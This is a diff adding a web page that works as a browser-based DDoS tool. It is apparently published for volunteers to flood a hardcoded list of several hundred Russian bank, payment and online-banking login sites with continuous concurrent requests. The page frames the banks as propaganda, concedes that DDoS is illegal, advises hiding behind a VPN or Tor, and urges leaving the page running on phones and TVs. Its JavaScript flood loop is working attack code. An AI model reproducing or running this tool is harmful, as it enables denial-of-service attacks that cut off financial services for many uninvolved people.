@@ -1,0 +1,699 @@
+<!doctype html>
+<html lang="en">
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
+    <title>Day 88 flood</title>
+    <link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+    <script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script> 
+	<script> 
+		/* Add "https://api.ipify.org?format=json" This method uses ipify.org api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+            color: #005BBC;
+            text-align: center;
+            margin-top: 2rem;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+    </style>
+<body>
+    <div class="modal" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="exampleModalLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR">&nbsp;Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;&nbsp;&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 88</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you're likely already aware, the action of DoSing or participating in DDoS is illegal, and for good reason.
+Click on continue if you have a VPN Enabled, use a proxy, use the Tor browser or have your own secure connection and wish to support Ukraine in taking down Russian propaganda.</p>
+    <hr style=" margin-top: 5px; margin-bottom: 5px;">
+    <p>This works by sending GET requests to each targeted website.<br>
+       It’s like opening each website at once on your PC and<br>
+      re-requesting the data over and over, although the data is not saved or cached, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its best to stay safe.</p></div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="exampleModalLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong>&nbsp;Info:</strong> Your Public IP Address is:&nbsp; </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span>&nbsp;<a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a>&nbsp;&nbsp;&nbsp;</div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">          Propaganda http(s) flood  for <span class="style15">Day 88 </span>using targets from the IT Army of Ukraine.        </p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between"><a href="https://pages.github.com/" target="_blank" class="style15">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day88.htm" target="_blank" class="style15">here</a>. A new page will be added for each day,  with a new set of targets   from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is  fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda. <br>
+                <br>
+                Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are
+chosen by an intelligence team who are always looking at what services are aiding Russia’s war,
+together we can pose a huge load on their infrastructure.</p>
+              <details>
+              <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+  <p><table width="100%" border="0">
+              <tbody>
+                <tr>
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> 
+                      open the developer console by pressing F12 and select the Network Tab.<br>
+                      If you're on a mac you can't use     F12 for this, instead right click anywhere on the site and click inspect, then click the network tab </p>
+                    <p class="style11" style="margin-bottom: 0px;"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This happens because everything that happens is logged by the browser, but you can stop it pretty easily.<br>
+                      In the Network tab on the developer console (F12), press both the red button and the stop symbol. </p>
+                    <details style="margin-bottom: 16px;">
+                      <summary><span style="color: #ffff99;">Click Here to see Example</span></summary>
+                      <img src="https://i.imgur.com/5Cw6kai.png" draggable="false"> </details>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> 
+                      This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>
+                  Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                </tr>
+              </tbody>
+            </table></p>
+</details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+If all requests are the same as all errors on some sites, it most likely means that the<br>
+site operator has banned the IP you’re using. </p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+    <div class="desc text-center" style=" padding-top: 4px;">
+      <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+      <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button>
+</div>
+<div id="stats" class="container">
+        <div class="row">
+        </div>
+    </div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+Glory to Ukraine, Glory to the hero’s. </p>
+<script>        
+        // target list
+        var urls = [
+            'https://sso.sbis.ru/auth-online/?ret=online.sbis.ru/',
+            'https://online.sberbank.ru/CSAFront/index.do',
+            'https://www.sberbank.ru/ru/person',
+            'https://www.akbars.ru/',
+            'https://auth.lockobank.ru/Account/Login',
+            'https://chelinvest.ru/index.php',
+            'https://online.metib.ru/auth/login',
+            'https://lk.chelinvest.ru/',
+            'https://metallinvestbank.ru/',
+            'https://p2p.chelinvest.ru/',
+            'https://i.lockobank.ru/Entry/Login/',
+            'https://www.lockobank.ru/',
+            'https://www.lockobank.ru/personal/kredit/',
+            'https://domrfbank.ru/',
+            'https://rencredit.ru/',
+            'https://rencredit.ru/loans/main/',
+            'https://online.akbars.ru/',
+            'https://ib.rencredit.ru/',
+            'https://my.metib.online/auth/login',
+            'https://online.domrfbank.ru/ru/html/login.html',
+            'https://my.domrfbank.ru/',
+            'https://databank.ru/',
+            'https://www.kuzbank.ru/',
+            'https://my.modulbank.ru/',
+            'https://ib.gebank.ru/login',
+            'https://retail.kuzbank.ru/rich/auth',
+            'https://dbo2.kuzbank.ru/rich/auth',
+            'https://ibank.gebank.ru/ru/html/login.html',
+            'https://online.databank.ru/',
+            'https://www.united.ru/',
+            'https://gebank.ru/',
+            'https://portal.kuzbank.ru/auth/login',
+            'https://modulbank.ru/',
+            'https://in-bank.ru/index.php',
+            'https://online.in-bank.ru/mobile2/',
+            'https://bank.faktura.ru/',
+            'https://faktura.ru/',
+            'https://novikom.ru/individuals/',
+            'https://online.novikom.ru/#/registration?redirect=%2F',
+            'https://koshelev-bank.ru/',
+            'https://online.k-bnk.ru/ibank2/',
+            'https://online.iturupbank.ru/web_banking/protected/welcome.jsf',
+            'https://ibank2.lanta.ru/ibank2/#/',
+            'https://biz.iturupbank.ru/ibank2/',
+            'http://www.iturupbank.ru/',
+            'https://www.lanta.ru/business/',
+            'https://www.moskb.ru/',
+            'https://ibank.moskb.ru/ibank2/',
+            'https://nbsrf.ru/',
+            'https://ib.solidbank.ru:8443/',
+            'https://www.pervbank.ru/personal/',
+            'https://kbb.ru/',
+            'https://www.promtransbank.ru/',
+            'https://bankvl.ru/',
+            'https://www.vlbb.ru/',
+            'https://solidbank.ru/',
+            'https://capitalbank.ru/',
+            'https://dbo.pervbank.ru/ibank2/',
+            'https://ibank-fl.moskb.ru/web_banking/protected/welcome.jsf',
+            'https://ibr.solidbank.ru:8443/',
+            'https://ibank.euroalliance.ru/ibank2/',
+            'https://online.euroalliance.ru/web_banking/protected/welcome.jsf',
+            'https://euroalliance.ru/',
+            'https://www.bancaintesa.ru/',
+            'https://digitale.bancaintesa.ru/ru/html/login.html',
+            'https://www.vtb.ru/',
+            'https://msponline.mspbank.ru/rbr_wr/',
+            'https://fiz.tavrich.ru/elf/app/',
+            'https://www.nico-bank.ru/',
+            'https://moymsp.mspbank.ru/ru/html/login.html',
+            'https://www.tavrich.ru',
+            'https://online.vtb.ru/login',
+            'https://pskb.com/',
+            'https://nbdbank.ru/',
+            'https://www.ns-bank.ru/',
+            'https://priovtb.com/',
+            'https://online.siab.ru/',
+            'https://www.energotransbank.com/',
+            'https://siab.ru/',
+            'https://ibank.nskbl.ru/',
+            'https://ib2.psbank.ru/login',
+            'https://www.psbank.ru/',
+            'https://mspbank.ru/',
+            'https://www.sibsoc.ru/',
+            'https://lk.nskbl.ru/',
+            'https://www.nskbl.ru/private/',
+            'https://fl.priovtb.com/',
+            'https://business.psbank.ru/',
+            'https://www.dvbank.ru/',
+            'https://wb-bank.ru/',
+            'https://dbo.bankkaluga.ru/v21/s/bsi.dll',
+            'https://ibank.dvbank.ru/ibank2/',
+            'https://ibank.dvbank.ru/web_banking/protected/welcome.jsf',
+            'https://ibank2.pskb.com/ibank2/',
+            'https://banksaratov.ru',
+            'https://slbank.ru/',
+            'https://ibank2.wb-bank.ru/ibank2/',
+            'https://www.bankkaluga.ru/',
+            'https://ibank2.kbhmb.ru/ibank2/',
+            'https://www.invb.ru/',
+            'https://ibank.invb.ru:6443/ibank2/',
+            'https://kbhmb.ru/',
+            'https://www.snbank.ru/',
+            'https://my.snbank.ru/',
+            'https://maritimebank.com/',
+            'https://corporate.psbank.ru/',
+            'https://online.invb.ru:5443/web_banking/protected/welcome.jsf',
+            'https://digital.energobank.ru/',
+            'https://online.sngb.ru/ibank/home?1',
+            'https://www.coalmetbank.ru/',
+            'https://energobank.ru/',
+            'https://dbo.energobank.ru/ru/html/login.html',
+            'https://bcu.umbank.ru/rich/auth',
+            'https://bca.umbank.ru/auth/login',
+            'https://www.sngb.ru',
+            'https://www.ibam.ru/',
+            'https://ibank.bank-mscb.ru/ibank2/',
+            'https://www.bank-mscb.ru/',
+            'https://www.rncb.ru/',
+            'https://online.albank.ru/',
+            'https://ipb.ru/',
+            'https://ibank.akibank.ru/ibank2/',
+            'https://ibank.akibank.ru/web_banking/protected/welcome.jsf',
+            'https://minbank.ru/',
+            'https://ib.minbank.ru/rich/auth',
+            'https://online.forabank.ru',
+            'https://lk.bcs.ru/',
+            'https://online.rncb.ru/web_banking/protected/welcome.jsf',
+            'https://ibam24.ru/ru/html/login.html',
+            'https://www.metcom.ru',
+            'https://www.forabank.ru/',
+            'https://on-line.ipb.ru/',
+            'https://www.albank.ru/ru/',
+            'https://ibank.gaztransbank.ru/ibank2/',
+            'https://skbbank.ru/chastnym-licam',
+            'https://www.gaztransbank.ru/',
+            'https://client.forabank.ru/ru/html/login.html',
+            'https://ibank2.metcom.ru/ibank2/',
+            'https://www.akibank.ru/',
+            'https://www.dalenabank.ru/',
+            'https://online.novobank.ru/auth/login',
+            'https://bcs.ru/',
+            'https://novobank.ru/',
+            'https://ib.skbbank.ru/login',
+            'https://www.bank-hlynov.ru/',
+            'https://i.metcom.ru/client/',
+            'https://ibank2.novobank.ru/ibank2/',
+            'https://my.bank-hlynov.ru/login/',
+            'https://dbo.dalenabank.ru/ibank2/',
+            'https://dbo.dalenabank.ru/web_banking/protected/welcome.jsf',
+            'https://www.chbrr.crimea.com/',
+            'https://alfabank.ru/get-money/credit/calculator/',
+            'https://www.nationalclearingcentre.ru/',
+            'https://primbank.ru/',
+            'https://mybank.primbank.ru/',
+            'https://online.uralsib.ru/login',
+            'https://ib.open.ru/webbank/',
+            'https://cb.open.ru/login',
+            'https://bankauto.ru/',
+            'https://online.bankauto.ru/login',
+            'https://timerbank.ru/',
+            'https://bp.open.ru/login',
+            'https://online.rshb.ru/b1/ib6/wf2/retail/ib/loginretaildefault',
+            'https://www.bspb.ru/retail/consumer-loan/cash/',
+            'https://my.pochtabank.ru/login?next=%2F',
+            'https://www.ubrr.ru/',
+            'https://www.minbank.ru/info/business/',
+            'https://www.chelindbank.ru/',
+            'https://i.zenit.ru/login?next=/',
+            'https://tkbbank.bankplus.ru/elf/app/',
+            'https://ibank.transcapital.com',
+            'https://www.cetelem.ru/avtokredit/',
+            'https://online.cetelem.ru/login.jsp',
+            'https://telebank.minbank.ru',
+            'https://i.vuzbank.ru/home',
+            'https://ibc.vuzbank.ru/ru/html/login.html',
+            'https://www.vuzbank.ru/chastnym-klientam/kredity',
+            'https://ib.bbr.ru/ibank2/',
+            'https://wb.bbr.ru/web_banking/protected/welcome.jsf',
+            'https://bank.bcs.ru/business',
+            'https://retail.etf-int.ru/register',
+            'https://solid.ru/business/rko/index.php',
+            'https://bank.solid.ru/ibank2/',
+            'https://credits.lockobank.ru',
+            'https://www.aresbank.ru/credit/',
+            'https://private.akbars.ru/',
+            'https://www.pochtabank.ru/',
+            'https://balance.faktura.ru/auth/realms/mdse/',
+            'https://business.faktura.ru/f2b/',
+            'https://business.faktura.ru/f2b/?site=iturupbank',
+            'https://business.faktura.ru/f2b/?site=maritimebank',
+            'https://business.faktura.ru/f2b/?site=ns-bank',
+            'https://business.faktura.ru/f2b/?site=tavrichbank',
+            'https://business.faktura.ru/f2b/?site=wildberries',
+            'https://elf.faktura.ru/elf/app/',
+            'https://elf.faktura.ru/elf/app/?site=bancaintesa',
+            'https://elf.faktura.ru/elf/app/?site=banksaratov',
+            'https://elf.faktura.ru/elf/app/?site=etbank',
+            'https://elf.faktura.ru/elf/app/?site=gaztransbank',
+            'https://elf.faktura.ru/elf/app/?site=kbb',
+            'https://elf.faktura.ru/elf/app/?site=kbhmb',
+            'https://elf.faktura.ru/elf/app/?site=lanta',
+            'https://elf.faktura.ru/elf/app/?site=maritimebank',
+            'https://elf.faktura.ru/elf/app/?site=nico',
+            'https://elf.faktura.ru/elf/app/?site=ns-bank',
+            'https://elf.faktura.ru/elf/app/?site=nskbl',
+            'https://elf.faktura.ru/elf/app/?site=primsoc',
+            'https://elf.faktura.ru/elf/app/?site=promtransbank',
+            'https://elf.faktura.ru/elf/app/?site=solidbank',
+            'https://elf.faktura.ru/elf/app/?site=vlbb',
+            'https://ikanobank.ru/',
+            'https://sfera.ru/',
+            'https://www.gorbank.spb.ru/',
+            'https://ib.gorbank.spb.ru/',
+            'https://testdbo.gorbank.spb.ru/',
+            'https://www.uralfd.ru/',
+            'https://online.gorbank.spb.ru/',
+            'https://dbo.uralfd.ru/',
+            'https://demodbo.uralfd.ru/',
+            'https://bankd.ru',
+            'https://mail.bankd.ru',
+            'https://online.uralfd.ru/',
+            'http://test.ndb24.ru',
+            'https://client.ndb24.ru/',
+            'https://market.ndb24.ru/',
+            'https://ca.severgazbank.ru/',
+            'https://ibc.severgazbank.ru/',
+            'https://ibank.bankd.ru/',
+            'https://files.rsb.ru/',
+            'https://wallet.rsb.ru/',
+            'https://investpay.ru',
+            'https://schet.uralsib.ru/',
+            'https://www.rusprofile.ru',
+            'https://www.novokib.ru',
+            'https://ecom.rsb.ru/',
+            'https://ibank2.rostfinance.ru/ibank2/',
+            'https://capital-bank.ru',
+            'https://nsbank.ru',
+            'https://b2b.nsbank.ru/',
+            'https://spsc.ru',
+            'https://www.probank.pro',
+            'https://ibank2.probank.pro/ibank2/',
+            'https://www.rostfinance.ru',
+            'https://bgfbank.ru',
+            'https://www.klookva.ru',
+            'https://bcspremier.ru',
+            'https://www.mbbru.ru',
+            'https://eleksir.finance',
+            'https://www.raexpert.ru',
+            'https://www.vl.ru',
+            'https://www.moscombank.ru',
+            'https://www.ingbank.ru',
+            'https://www.emb.ru',
+            'https://avtotorgbank.ru',
+            'https://www.nkoerp.ru',
+            'https://bcosm.ru',
+            'https://www.nkbank.ru',
+            'https://www.tenderbank.ru',
+            'https://www.kremlinbank.ru',
+            'https://rusfincorp.ru',
+            'https://sinko-bank.ru',
+            'https://wumte.ru',
+            'https://ymkbank.ru',
+            'https://www.ssb.msk.ru',
+            'https://obr1016.ru',
+            'https://www.ufb.ru',
+            'https://vlb100.ru',
+            'https://cibl.ru',
+            'https://nib-samara.ru',
+            'https://www.eatpbank.ru',
+            'https://www.kubank.ru',
+            'https://mcc.elecsnet.ru',
+            'https://mcc.elecsnet.ru',
+            'https://www.balakovo-bank.ru',
+            'https://www.derzhava.ru',
+            'https://econombank.ru',
+            'https://nkopremium.ru',
+            'https://www.bstbank.ru',
+            'https://www.nokss.ru',
+            'https://www.zhivagobank.ru',
+            'https://rusnarbank.ru',
+            'https://emoney.kkb.ru',
+            'https://kb-tub.ru',
+            'https://m.bspb.ru',
+            'https://bankiros.ru',
+            'https://dtb1.ru',
+            'https://sbionline.ru',
+            'https://www.baikalcredobank.ru',
+            'https://www.inkakhran.ru',
+            'https://iturupbank.ru',
+            'https://ruszembank.ru',
+            'https://www.rosavtobank.ru',
+            'https://www.neal.ru',
+            'https://smbcr-bank.ru',
+            'https://bktb.ru',
+            'https://vbankcenter.ru',
+            'https://fincher.ru',
+            'https://alexbank.ru',
+            'https://www.dcapital.ru',
+            'https://evrofinance.ru',
+            'https://www.round.ru',
+            'https://ozonbankdocs.ru',
+            'https://mtcfinance.ru',
+            'https://www.krasplat.ru',
+            'https://www.russitabank.ru',
+            'https://www.eco-invest.ru',
+            'https://prioritet-org.ru',
+            'https://www.transstroybank.ru',
+            'https://stkbank.ru',
+            'https://rnko-kholmsk.ru',
+            'https://www.psib.ru',
+            'https://bankirsha.com',
+            'https://kuzbasshimbank.ru',
+            'https://www.pscb.ru',
+            'https://pscb.ru',
+            'https://www.kamkombank.ru',
+            'https://psbinvest.ru',
+            'https://www.bankrmp.ru',
+            'https://www.mobi-money.ru',
+            'https://profitbank.ru',
+            'https://dbo.finbank.ru',
+            'https://www.belsocbank.ru',
+            'https://www.km-bank.ru',
+            'https://brobank.ru',
+            'https://www.vfbank.ru',
+            'https://derzhava.online',
+            'https://www.apkbank.ru',
+            'https://www.admbank.ru',
+            'https://www.bankperm.ru',
+            'https://riabank.ru',
+            'https://bcs-bank.com',
+            'https://www.cyberplat.ru',
+            'https://ibsp.ru',
+            'https://pay.uralprombank.ru',
+            'https://www.sbnk.ru',
+            'https://rnko.ru',
+            'https://card2card.intervale.ru',
+            'https://perevedi.me',
+            'https://www.avangard.ru',
+            'https://www.metallurgbank.ru',
+            'https://www.bankdolinsk.ru',
+            'https://i.bspb.ru',
+            'https://i.bspb.ru',
+            'https://online.payment.ru',
+            'https://www.bystrobank.ru',
+            'https://socium-bank.ru',
+            'https://absolutbank.ru',
+            'https://sber.ru',
+            'https://www.el-plat.ru',
+            'https://www.bankodrom.ru',
+            'https://altbank.com',
+            'https://koronapay.com',
+        ];
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('exampleModal'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h4>${urls[i]}</h4>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+</html>
